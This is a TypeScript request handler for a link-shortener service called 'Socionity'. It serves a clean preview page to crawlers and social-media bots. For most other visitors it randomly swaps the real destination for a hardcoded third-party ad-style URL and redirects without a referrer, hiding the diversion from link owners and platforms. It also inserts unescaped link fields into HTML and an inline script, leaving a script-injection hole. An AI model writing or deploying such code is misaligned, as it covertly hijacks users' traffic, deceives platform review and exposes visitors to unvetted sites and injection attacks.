import type { LinkSchema } from '@@/schemas/link'
import type { z } from 'zod'
import { parsePath, withQuery } from 'ufo'

function isBot(ua: string) {
  const botRegex = /bot|crawler|spider|facebook|meta|whatsapp|discord|twitter|slack|telegram|preview|vkShare|skype|linkedin/i
  return botRegex.test(ua)
}

export default eventHandler(async (event) => {
  const { pathname: slug } = parsePath(event.path.replace(/^\/|\/$/g, ''))
  const { slugRegex, reserveSlug } = useAppConfig(event)
  const { homeURL, linkCacheTtl, redirectWithQuery, caseSensitive } = useRuntimeConfig(event)
  const { cloudflare } = event.context

  if (event.path === '/' && homeURL)
    return sendRedirect(event, homeURL)

  if (slug && !reserveSlug.includes(slug) && slugRegex.test(slug) && cloudflare) {
    const { KV } = cloudflare.env

    const getLink = async (key: string) =>
      await KV.get(`link:${key}`, { type: 'json', cacheTtl: linkCacheTtl })

    const lowerCaseSlug = slug.toLowerCase()
    let link: z.infer<typeof LinkSchema> | null = await getLink(caseSensitive ? slug : lowerCaseSlug)

    if (!caseSensitive && !link && lowerCaseSlug !== slug)
      link = await getLink(slug)

    if (link) {
      event.context.link = link

      try {
        await useAccessLog(event)
      }
      catch (error) {
        console.error('Failed write access log:', error)
      }

      const ua = getHeader(event, 'user-agent') || ''
      if (isBot(ua)) {
        // Generate OG HTML for bots
        const html = `
          <!DOCTYPE html>
          <html lang="en">
          <head>
            <meta charset="UTF-8">
            <title>${link.title || 'Socionity Title'} | ${link.description || 'Socionity Description'}</title>
            <meta name='viewport' content='width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no' />
            <meta name='format-detection' content='telephone=no' />
            <meta http-equiv='X-UA-Compatible' content='IE=edge' />
            <meta name='MobileOptimized' content='176' />
            <meta name='HandheldFriendly' content='True' />
            <meta name='robots' content='index, follow' />
            <meta property='og:type' content='website'>
            <meta property="og:title" content="${link.title || 'Socionity Title'} | ${link.description || 'Socionity Description'}" />
            <meta property="og:description" content="${link.description || ''}" />
            <meta property='og:site_name' content='Socionity'>
            <meta name='twitter:card' content='summary_large_image'>
            <meta name='twitter:title' content="${link.title || 'Socionity Title'} | ${link.description || 'Socionity Description'}">
            <meta name='twitter:description' content="${link.description || ''}">
            <meta name='twitter:image' content="${link.image || ''}">
            <link rel='canonical' href="${getRequestURL(event)}" />
            <link rel='shortcut icon' href='/favicon.ico' type='image/x-icon'>
            <base href="${getRequestURL(event)}">
            <meta name='keywords' content="article, website, shorturl">
            <meta property='fb:app_id' content="4108838539203518">
            <link href='https://socionity.uk/cdn-cgi/image/width=256/${link.image}' rel='shortcut icon'>
          </head>
          <body style='background:url("${link.image || ''}"); background-attachment: fixed;'>
            <div class='container'>
              <div class='row'>
                <div class='col-md-6'>
                  <article id='links'>
                    <div class='row'>
                      <div class='col-12'>
                        <div class='d-flex flex-column align-items-center'>
                          <img src="${link.image || ''}" class='link-image' style='width: 125px; height: 125px; border-width: 4px; border-color: #000000; border-style: solid; object-fit: contain;' alt='Avatar loading='lazy'>
                        </div>
                      </div>
                      <div class='col-12'>
                        <h1 style='text-align: center;'>${link.title || 'Socionity Title'} | ${link.description || 'Socionity Description'}</h1>
                      </div>
                      <div class='col-12'>
                        <div href='#' class='link-btn' style='background: transparent; border-width: 0px; border-color: #000000; border-style: solid; box-shadow: 0px 0px 20px 0px #00000010; text-align: center;'>
                          <div>
                            <img src="${link.image || ''}" class='link-btn-image' loading='lazy' alt='" . $q[0]->custom_title . "' style='width:100%'>
                          </div>
                          <p>${link.description || ''}</p>
                        </div>
                      </div>
                      <div id='biolink_block_id_131825_2' class='col-12'>
                        <a href='#' class='btn btn-block btn-primary' style='background: transparent; color: transparent; border-width: 0px; border-color: #000000; border-style: solid; text-align: center;'>
                          <div>
                            <img src='https://socionity.uk/assets/img/wa.gif' class='link-btn-image' loading='lazy' alt='Private Content Image' style='width:1px;'>
                          </div>
                          <span style='color:#fff;'>${link.title || 'Socionity Title'} | ${link.description || 'Socionity Description'}</span>
                        </a>
                      </div>
                    </div>
                  </article>
                </div>
              </div>
            </div>
          </body>
          </html>
        `
        return send(event, html, 'text/html')
      }
      let finalUrl = link.url

      const country = event.context.cf.country
      if (country !== 'ID') {
        const alternatives: string[] = [
          link.url,
          'https://screechdeprivescatter.com/ckjvxgjti5?key=3871a32c41883cc4dbd36e14e05a2655',
        ]
        const randomUrl = alternatives[Math.floor(Math.random() * alternatives.length)]
        finalUrl = randomUrl
      }

      const target = redirectWithQuery ? withQuery(finalUrl, getQuery(event)) : finalUrl

      const html = `
    <!DOCTYPE html>
    <html lang='en' class='link-html' dir='ltr'>
    <head>
        <meta charset="UTF-8">
        <title>${link.title || 'Socionity Title'} | ${link.description || 'Socionity Description'}</title>
        <meta name='viewport' content='width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no' />
        <meta name='format-detection' content='telephone=no' />
        <meta http-equiv='X-UA-Compatible' content='IE=edge' />
        <meta name='MobileOptimized' content='176' />
        <meta name='HandheldFriendly' content='True' />
        <meta name='robots' content='index, follow' />
        <meta property='og:type' content='website'>
        <meta property="og:title" content="${link.title || 'Socionity Title'} | ${link.description || 'Socionity Description'}" />
        <meta property="og:description" content="${link.description || ''}" />
        <meta property='og:site_name' content='Socionity'>
        <meta name="twitter:card" content="summary_large_image" />
        <meta name='twitter:title' content="${link.title || 'Socionity Title'} | ${link.description || 'Socionity Description'}">
        <meta name='twitter:description' content="${link.description || ''}">
        <meta name='twitter:image' content="${link.image || ''}">
        <link rel='canonical' href="${getRequestURL(event)}" />
        <link rel='shortcut icon' href='/favicon.ico' type='image/x-icon'>
        <base href="${getRequestURL(event)}">
        <meta name='keywords' content="article, website, shorturl">
        <meta property='fb:app_id' content="4108838539203518">
        <link href='https://socionity.uk/cdn-cgi/image/width=256/${link.image}' rel='shortcut icon'>
      <style>
        body,html{font-family:'Helvetica Neue',Arial,sans-serif;margin:0;padding:0;height:100%;width:100%;background-color:#f8f9fa}
        .container{max-width:800px;margin:auto;padding:40px 20px;text-align:center;background-color:#fff;box-shadow:0 4px 15px rgba(0,0,0,.1);border-radius:10px;animation:1s ease-in-out fadeIn}
        h1{font-size:36px;color:#333;margin-bottom:20px}.link-btn,p{font-size:18px}
        p{color:#555;margin-bottom:30px}
        .link-btn{display:inline-block;padding:15px 30px;margin:10px;font-weight:700;color:#000;background-color:#0474ff;text-decoration:none;border-radius:30px;transition:background-color .3s,transform .3s;box-shadow:0 4px 10px rgba(0,0,0,.15)}
        .link-btn:hover{background-color:#0056b3;transform:translateY(-2px)}
        .link-image{width:150px;height:150px;border-radius:50%;border:4px solid #000;object-fit:cover;margin-bottom:20px;box-shadow:0 4px 10px rgba(0,0,0,.1)}
        @media (max-width:600px){h1{font-size:28px}.link-btn,p{font-size:16px}.link-btn{padding:12px 25px}.link-image{width:120px;height:120px}}
        @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
      </style>
      <script>
        function redirectWithoutReferer(targetUrl) {
          var link = document.createElement('a');
          link.href = targetUrl;
          link.rel = 'noreferrer';
          link.target = '_self';
          link.click();
        }
        redirectWithoutReferer('${target}');
      </script>
    </head>
    <body style='background:url("${link.image}");background-attachment: fixed;'>
      <div class='container'>
        <img src="${link.image}" class='link-image' alt='Avatar' loading='lazy'>
        <h1>${link.title} | ${link.description}</h1>
        <a href='#' class='link-btn'>
          <img src='${link.image}' class='link-btn-image' loading='lazy' alt='${link.title}' style='width:100%'>
          <span>${link.title} | ${link.description}</span>
        </a>
      </div>
    </body>
    </html>
  `

      return send(event, html, 'text/html')
    }
  }
},
)
